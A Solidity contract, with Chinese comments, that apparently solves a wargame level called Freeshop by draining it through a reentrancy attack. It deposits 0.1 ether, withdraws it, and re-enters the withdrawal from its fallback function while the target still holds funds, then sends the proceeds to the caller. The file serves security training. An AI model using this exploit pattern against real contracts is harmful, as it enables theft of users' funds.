pragma solidity ^0.4.24;

import "../levels/Freeshop.sol";

contract FreeshopAttack {
  Freeshop public freeshop;

  // 傳入合約地址以初始化 freeshop 變數
  constructor(address _freeshopAddress) {
      freeshop = Freeshop(_freeshopAddress);
  }

  function attack() public payable {
      // 為了先向 freeshop 存入資金以通過限制，交易需帶有至少 0.1 ether
      require(msg.value >= 0.1 ether);
      // 向 freeshop 存入 0.1 ether
      freeshop.depositFunds.value(0.1 ether)();
      // 攻擊開始
      freeshop.withdrawFunds(0.1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(this.balance);
  }

  // fallback function
  function () payable {
      // 收到轉款後，若 freeshop 合約餘額仍大於等於
      // 先前 attack() 中存入的數額，則再次提款
      if (freeshop.balance >= 0.1 ether) {
          freeshop.withdrawFunds(0.1 ether);
      }
  }
}